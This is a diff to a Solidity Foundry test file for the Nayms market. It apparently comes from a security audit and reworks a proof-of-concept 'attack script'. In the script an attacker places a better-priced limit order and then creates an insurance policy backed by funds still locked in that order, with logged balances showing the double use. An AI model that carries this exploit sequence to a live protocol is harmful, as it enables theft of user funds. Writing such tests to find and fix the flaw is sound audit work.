@@ -813,9 +813,7 @@ contract T04MarketTest is D03ProtocolDefaults, MockAccounts {
         nayms.addSupportedExternalToken(usdcAddress);
 
         uint256 usdc1000 = 1000e6;
-        uint256 usdc900 = 900e6;
         uint256 pToken100 = 100e18;
-        uint256 pToken90 = 90e18;
 
         // prettier-ignore
         Entity memory entityData = Entity({ 
@@ -829,35 +827,51 @@ contract T04MarketTest is D03ProtocolDefaults, MockAccounts {
         NaymsAccount memory attacker = makeNaymsAcc("Attacker");
         NaymsAccount memory userA = makeNaymsAcc("entityA");
         NaymsAccount memory userB = makeNaymsAcc("entityB");
+        NaymsAccount memory userC = makeNaymsAcc("entityC");
 
         vm.startPrank(sm.addr);
 
-        // createEntity for attacker
+        // create entities
         hCreateEntity(attacker.entityId, attacker.id, entityData, "test entity");
+        hCreateEntity(userA.entityId, userA.id, entityData, "entity test hash");
         hCreateEntity(userB.entityId, userB.id, entityData, "entity test hash");
+        hCreateEntity(userC.entityId, userC.id, entityData, "entity test hash");
 
-        // Attacker deposits 1000 USDC + trading fee
+        // deposit 1000 USDC + trading fee(10 USDC)
         fundEntityUsdc(attacker, usdc1000 + 1e7);
+        fundEntityUsdc(userA, usdc1000 + 1e7);
         fundEntityUsdc(userB, usdc1000 + 1e7);
 
         vm.startPrank(sm.addr);
 
-        hCreateEntity(userA.entityId, userA.id, entityData, "entity test hash");
+        // userC startTokenSale with (100 pToken for 1000.000001 USDC)
+        c.log("- [0] userC startTokenSale".yellow());
+        nayms.enableEntityTokenization(userC.entityId, "EC", "Entity-C-Token");
+        nayms.startTokenSale(userC.entityId, pToken100, usdc1000 + 1);
+        c.log("      userB USDC internalBalance:", nayms.internalBalanceOf(userB.entityId, usdcId));
+        c.log("      userB USDC lockedBalance:  ", nayms.getLockedBalance(userB.entityId, usdcId).green());
+        c.log("      userB E3 internalBalance:  ", nayms.internalBalanceOf(userB.entityId, userC.entityId).green());
 
-        // userA startTokenSale with (1000 pToken for USDC)
-        nayms.enableEntityTokenization(userA.entityId, "E1", "Entity 1 Token");
-        nayms.startTokenSale(userA.entityId, pToken100, usdc1000 + 1);
+        // userB Buy all pTokens
+        c.log("- [1] userB Buy all pTokens".yellow());
+        vm.startPrank(userB.addr);
+        nayms.executeLimitOffer(usdcId, usdc1000 + 1, userC.entityId, pToken100);
+        c.log("      userB USDC internalBalance:", nayms.internalBalanceOf(userB.entityId, usdcId));
+        c.log("      userB USDC lockedBalance:  ", nayms.getLockedBalance(userB.entityId, usdcId).green());
+        c.log("      userB E3 internalBalance:  ", nayms.internalBalanceOf(userB.entityId, userC.entityId).green());
 
-        c.log("- [0] before attack trade".yellow());
+        c.log("- [2] userA executeLimitOffer".yellow());
+        vm.startPrank(userA.addr);
+        nayms.executeLimitOffer(usdcId, usdc1000, userC.entityId, pToken100);
         c.log("      attacker internalBalance:", nayms.internalBalanceOf(attacker.entityId, usdcId));
         c.log("      attacker lockedBalance:  ", nayms.getLockedBalance(attacker.entityId, usdcId).green());
 
         // Attack script
 
         vm.startPrank(attacker.addr);
-        nayms.executeLimitOffer(usdcId, usdc1000, userA.entityId, pToken100);
+        nayms.executeLimitOffer(usdcId, usdc1000, userC.entityId, pToken100 - 1);
 
-        c.log("- [1] attack order placed".yellow());
+        c.log("- [3] attack order placed with better price".yellow());
         c.log("      attacker internalBalance:", nayms.internalBalanceOf(attacker.entityId, usdcId));
         c.log("      attacker lockedBalance:  ", nayms.getLockedBalance(attacker.entityId, usdcId).green());
 
@@ -866,22 +880,21 @@ contract T04MarketTest is D03ProtocolDefaults, MockAccounts {
         uint256 policyLimitAmount = (usdc1000 * 10_000) / entityData.collateralRatio;
         (Stakeholders memory stakeholders, SimplePolicy memory simplePolicy) = initPolicyWithLimitAndAsset("offChainHash", policyLimitAmount, usdcId);
 
-        // vm.expectRevert("not enough capital");
         nayms.createSimplePolicy(bytes32("1"), attacker.entityId, stakeholders, simplePolicy, "offChainHash");
+        c.log("- [4] policy created by attacker".yellow());
+        c.log("      attacker internalBalance:", nayms.internalBalanceOf(attacker.entityId, usdcId));
+        c.log("      attacker lockedBalance:  ", nayms.getLockedBalance(attacker.entityId, usdcId).green());
 
-        c.log("- [2] policy created".yellow());
+        c.log("- [5] userB ballances".yellow());
+        c.log("      userB USDC internalBalance:", nayms.internalBalanceOf(userB.entityId, usdcId));
+        c.log("      userB USDC lockedBalance:  ", nayms.getLockedBalance(userB.entityId, usdcId).green());
+        c.log("      userB E3 internalBalance:  ", nayms.internalBalanceOf(userB.entityId, userC.entityId).green());
 
-        uint256 lockedBalance = nayms.getLockedBalance(attacker.entityId, usdcId);
-        uint256 internalBalance = nayms.internalBalanceOf(attacker.entityId, usdcId);
-        c.log("      attacker internalBalance:", internalBalance);
-        c.log("      attacker lockedBalance:  ", lockedBalance.green());
-        // require(lockedBalance <= internalBalance, "Attack successful");
-
-        c.log("- [3] userB placing order".yellow());
+        c.log("- [6] userB placing order".yellow());
         vm.startPrank(userB.addr);
-        nayms.executeLimitOffer(usdcId, usdc1000 + 1, userA.entityId, pToken100);
+        nayms.executeLimitOffer(userC.entityId, pToken100, usdcId, usdc1000);
 
-        c.log("- [4] userB offer matched".yellow());
+        c.log("- [7] userB offer matched".yellow());
         c.log("      userB pTokenBalance:", nayms.internalBalanceOf(userB.entityId, userA.entityId));
     }
 
@@ -894,5 +907,4 @@ contract T04MarketTest is D03ProtocolDefaults, MockAccounts {
         uint256 balanceAfter = nayms.internalBalanceOf(acc.entityId, usdcId);
         assertEq(balanceAfter, balanceBefore + amount, "entity's weth balance is incorrect");
     }
-
 }
